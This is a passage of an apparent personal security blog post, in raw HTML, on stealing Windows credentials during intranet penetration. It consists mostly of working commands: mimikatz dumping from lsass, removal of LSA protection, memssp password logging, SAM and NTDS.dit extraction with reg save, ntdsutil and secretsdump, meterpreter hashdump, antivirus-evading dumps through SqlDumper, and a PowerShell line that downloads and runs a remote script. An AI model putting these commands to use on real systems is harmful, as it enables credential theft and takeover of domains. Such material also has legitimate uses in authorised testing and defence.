+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\InstallUtil.exe /logfile= /LogToConsole=false /U PELoaderofMimikatzAuto.exe</span><br></pre></td></tr></table></figure>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/DumpLsass.cs" >DumpLsass.cs<i class="fas fa-external-link-alt"></i></a> will create <code>lsass.exe</code> dump file in the current dir after running, needs to compile by <code>csc.exe</code>. </p>
+<h4 id="Limited-Download-Length"><a href="#Limited-Download-Length" class="headerlink" title="Limited Download Length"></a>Limited Download Length</h4><p>Sometime we cannot download big dump file that easily, so we export credentials on target, and download the credentials.<br>We have <a class="link"   target="_blank" rel="noopener" href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SafetyKatz.cs" >SafetyKatz<i class="fas fa-external-link-alt"></i></a>.<br>Compile it.</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v3.<span class="number">5</span>\csc.exe SafetyKatz.cs /unsafe</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\csc.exe SafetyKatz.cs /unsafe</span><br></pre></td></tr></table></figure>
+
+<h4 id="LSA-Protection"><a href="#LSA-Protection" class="headerlink" title="LSA Protection"></a>LSA Protection</h4><p>Microsoft added <code>LSA protection</code> policy on March 12, 2014 to prevent injection to <code>lsass.exe</code>. Add a DWORD(32) <code>RunAsPPL</code> with value <code>00000001</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br></pre></td></tr></table></figure>
+<p>To bypass it, we can read <code>SAM</code> on disk.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::whoami</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br></pre></td></tr></table></figure>
+<p><code>mimikatz</code> also use <code>mimidrv.sys</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # !+</span><br><span class="line">mimikatz # !processprotect /process:lsass.exe /remove</span><br></pre></td></tr></table></figure>
+
+<h4 id="Credential-Guard"><a href="#Credential-Guard" class="headerlink" title="Credential Guard"></a>Credential Guard</h4><p>on Windows 10 and Windows Server 2016, Microsoft implements <code>Credential Guard</code>, which is based on virtualization technology and isolating the <code>lsass</code> process to protect credentials. With <code>Credential Guard</code>, lsass consists of two process: normal LSA ,and isolated LSA that running in VM.<br>Reading <code>SAM</code> on disk still bypass.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::whoami</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br></pre></td></tr></table></figure>
+<p>Or using <code>SSP</code> which is the software called when user logs, and receives user credentials. <code>SSP</code> will be loaded in <code>lsass.exe</code> process after system booting.<br><code>mimikatz</code> can install custom <code>SSP</code> through memory, edit <code>lsass</code> memory and extract credentials in it.<br>After executing <code>misc::memssp</code> in <code>mimikatz</code>, if some user login, <code>mimilsa.log</code> ,with user plain password in it, will be created in <code>c:\windows\system32</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # misc::memssp</span><br></pre></td></tr></table></figure>
+
+<p>Note:<br>Despite that, try <code>lsadump::secrets</code> to get <code>syskey</code> in the registry to decrypt. <code>PwDump7</code>, <code>QuarksPwDump</code> and other tools are also useful to bypass LSA Protection and Credential Guard.<br>If cmd, regedit and taskmgr are also disabled, <code>mimikatz</code> can still get over it.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # misc::cmd</span><br><span class="line">mimikatz # misc::regedit</span><br><span class="line">mimikatz # misc::taskmgr</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="From-SAM-File"><a href="#From-SAM-File" class="headerlink" title="From SAM File"></a>From <code>SAM</code> File</h3><p>As I mentioned, <code>SAM</code> file saves password hash of the <code>Workgroup</code>, so we can extract something from it, like from <code>lsass.exe</code>. What you get is only local users’ or logged in users’ hashes.</p>
+<p>Export <code>SAM</code> file data:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">&gt; reg save HKLM\SAM SAM</span><br></pre></td></tr></table></figure>
+<p>Use <code>mimikatz</code> to extract hash:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>
+
+<h3 id="From-NTDS-dit-File"><a href="#From-NTDS-dit-File" class="headerlink" title="From NTDS.dit File"></a>From <code>NTDS.dit</code> File</h3><p>I also mentioned in <code>Domain</code>, <code>NTDS.dit</code> stores all <code>Domain Member</code> password hashes (For <code>Domain Controller</code>).</p>
+<p>Export <code>NTDS.dit</code> data:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; ntdsutil <span class="string">&quot;ac i ntds&quot;</span> ifm <span class="string">&quot;create full c:\users\tmp&quot;</span> q q</span><br></pre></td></tr></table></figure>
+<p>Then use <a class="link"   target="_blank" rel="noopener" href="https://github.com/zcgonvh/NTDSDumpEx/releases" >NTDSDumpEx<i class="fas fa-external-link-alt"></i></a> to extract user hashes:</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">cd</span> c:\users\tmp</span><br><span class="line">&gt; NTDSDumpEx <span class="literal">-d</span> ntds.dit <span class="literal">-s</span> system <span class="literal">-o</span> domain.txt</span><br></pre></td></tr></table></figure>
+<p>Another util – <a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/impacket/examples/secretsdump.py" >secretsdump<i class="fas fa-external-link-alt"></i></a> of Python library <code>impacket</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; python secretsdump.py -system SYSTEM -ntds ntds.dit local</span><br></pre></td></tr></table></figure>
+<p>It is really powerful, can extract hashes in both <code>SAM</code> and in <code>Domain</code>. </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; python secretsdump.py user_name:password@target_ip</span><br></pre></td></tr></table></figure>
+
+
+<h3 id="Tools-to-Capture-Hash"><a href="#Tools-to-Capture-Hash" class="headerlink" title="Tools to Capture Hash"></a>Tools to Capture Hash</h3><ul>
+<li><p><code>mimikatz</code> is more than just capturing the hashes. See <a class="link"   target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz/wiki" >Wiki<i class="fas fa-external-link-alt"></i></a> to find more help.</p>
+</li>
+<li><p>Powershell pentest framework like <code>nishang</code> usually have useful scripts to get hashes:<code>powershell iex (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes</code></p>
+</li>
+<li><p>As for <code>metasploit</code>, <code>meterpreter</code> has some built-in cmds:</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">meterpreter &gt; run hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
+<p>  load <code>mimikatz</code> to do more:</p>
+  <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz   <span class="comment"># necessary</span></span><br><span class="line">meterpreter &gt; msv</span><br><span class="line">meterpreter &gt; tspkg</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">meterpreter &gt; kerberos</span><br><span class="line">meterpreter &gt; ssp</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure></li>
+<li><p>Windows Credentials Editor (WCE) is also famous to do intranet pentest. Download <a class="link"   target="_blank" rel="noopener" href="https://www.ampliasecurity.com/research/wce_v1_42beta_x32.zip" >x32<i class="fas fa-external-link-alt"></i></a>, <a class="link"   target="_blank" rel="noopener" href="https://www.ampliasecurity.com/research/wce_v1_42beta_x64.zip" >x64<i class="fas fa-external-link-alt"></i></a> or <a class="link"   target="_blank" rel="noopener" href="https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip" >universal<i class="fas fa-external-link-alt"></i></a>.</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/quarkslab/quarkspwdump"><code>Quarks PwDump</code></a> is kind of old, which used to be a stabe hash capturer.</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump"><code>ProcDump</code></a> belongs to Windows Sysnternals Suite, which belongs to Microsoft now. Therefore it is able to bypass some antivirus softwares. Working with `mimikatz is talked <a href="#Normal-Ways">before</a></p>
+</li>
+<li><p><code>SqlDumper.exe</code> is belong to Microsoft and exists in SQL Server directory, also capable for bypassing antivirus software.It is stored in <code>C:\Program Files\Microsoft SQL Server\number\Shared</code> by default, but if SQL Server is uninstalled, you have to upload. Use it like:</p>
+  <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; tasklist /svc | findstr lsass.exe  <span class="comment"># see lsass.exe PID</span></span><br><span class="line">&gt; Sqldumper.exe ProcessID <span class="number">0</span> <span class="number">0</span>x01100  <span class="comment"># export dump hash</span></span><br><span class="line"><span class="comment"># then use mimmikatz (same OS version needed) to extract hash </span></span><br><span class="line">&gt; mimikatz.exe <span class="string">&quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+
+        </div>
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/05/29/2020-05-29-Some-Network-File-Sharing-Services/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Some Network File Sharing Services</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/03/31/2020-03-31-About-Reverse-Shell/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">About Reverse Shell</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span>&nbsp;-&nbsp;
+            
+            2021&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">TyeYeah</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Basic-Knowledge"><span class="nav-number">1.</span> <span class="nav-text">Basic Knowledge</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NTLM-Protocol"><span class="nav-number">1.1.</span> <span class="nav-text">NTLM Protocol</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#LM-Hash"><span class="nav-number">1.1.1.</span> <span class="nav-text">LM Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NTLM-Hash"><span class="nav-number">1.1.2.</span> <span class="nav-text">NTLM Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#NTLM-Authentication"><span class="nav-number">1.1.3.</span> <span class="nav-text">NTLM Authentication</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerberos-Protocol"><span class="nav-number">1.2.</span> <span class="nav-text">Kerberos Protocol</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Golden-Ticket"><span class="nav-number">1.3.</span> <span class="nav-text">Golden Ticket</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Mimikatz"><span class="nav-number">1.3.1.</span> <span class="nav-text">Mimikatz</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CobaltStrike"><span class="nav-number">1.3.2.</span> <span class="nav-text">CobaltStrike</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Metasploit"><span class="nav-number">1.3.3.</span> <span class="nav-text">Metasploit</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Silver-Ticket"><span class="nav-number">1.4.</span> <span class="nav-text">Silver Ticket</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Other-Methods-to-Abuse-Kerberos"><span class="nav-number">1.5.</span> <span class="nav-text">Other Methods to Abuse Kerberos</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass-The-Hash"><span class="nav-number">1.6.</span> <span class="nav-text">Pass The Hash</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Capture-NTLM-Hash"><span class="nav-number">1.6.1.</span> <span class="nav-text">Capture NTLM Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PTH-Tools"><span class="nav-number">1.6.2.</span> <span class="nav-text">PTH Tools</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pass-The-Key"><span class="nav-number">1.6.3.</span> <span class="nav-text">Pass The Key</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Pass-The-Ticket"><span class="nav-number">1.6.4.</span> <span class="nav-text">Pass The Ticket</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Related"><span class="nav-number">1.6.5.</span> <span class="nav-text">Related</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Steal-Credentials"><span class="nav-number">2.</span> <span class="nav-text">Steal Credentials</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#From-lsass-exe-Process"><span class="nav-number">2.1.</span> <span class="nav-text">From lsass.exe Process</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Normal-Ways"><span class="nav-number">2.1.1.</span> <span class="nav-text">Normal Ways</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Limited-Upload-Length"><span class="nav-number">2.1.2.</span> <span class="nav-text">Limited Upload Length</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Limited-Download-Length"><span class="nav-number">2.1.3.</span> <span class="nav-text">Limited Download Length</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LSA-Protection"><span class="nav-number">2.1.4.</span> <span class="nav-text">LSA Protection</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Credential-Guard"><span class="nav-number">2.1.5.</span> <span class="nav-text">Credential Guard</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#From-SAM-File"><span class="nav-number">2.2.</span> <span class="nav-text">From SAM File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#From-NTDS-dit-File"><span class="nav-number">2.3.</span> <span class="nav-text">From NTDS.dit File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Tools-to-Capture-Hash"><span class="nav-number">2.4.</span> <span class="nav-text">Tools to Capture Hash</span></a></li></ol></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
